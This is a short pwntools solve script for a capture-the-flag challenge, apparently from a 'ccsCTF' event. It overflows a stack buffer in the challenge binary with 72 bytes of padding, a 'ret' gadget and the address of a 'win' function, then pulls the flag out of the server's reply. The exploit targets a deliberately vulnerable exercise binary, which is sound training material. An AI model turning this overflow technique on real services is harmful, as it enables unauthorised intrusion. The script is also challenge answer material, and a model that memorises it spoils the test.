#!/usr/bin/env -S uv run --script
# /// script
# requires-python = ">=3.12"
# dependencies = ["pwntools==4.14.1"]
# ///
"""Dependencies: pwntools==4.14.1. Build dist/ before solving."""
import re
import sys
from pathlib import Path
from pwn import ELF, ROP, context, p64, remote

context.log_level = "error"
context.arch = "amd64"
elf = ELF(str(Path(__file__).resolve().parents[1] / "dist/chall"), checksec=False)
ret = ROP(elf).find_gadget(["ret"]).address
with remote(sys.argv[1], int(sys.argv[2]), timeout=10) as tube:
    tube.recvuntil(b"Carve your pumpkin:\n", timeout=10)
    tube.send(b"A" * 72 + p64(ret) + p64(elf.symbols["win"]))
    result = re.search(rb"ccsCTF\{[^}]+\}", tube.recvall(timeout=10))
    if result is None:
        raise SystemExit("Flag not received")
    print(result.group().decode())
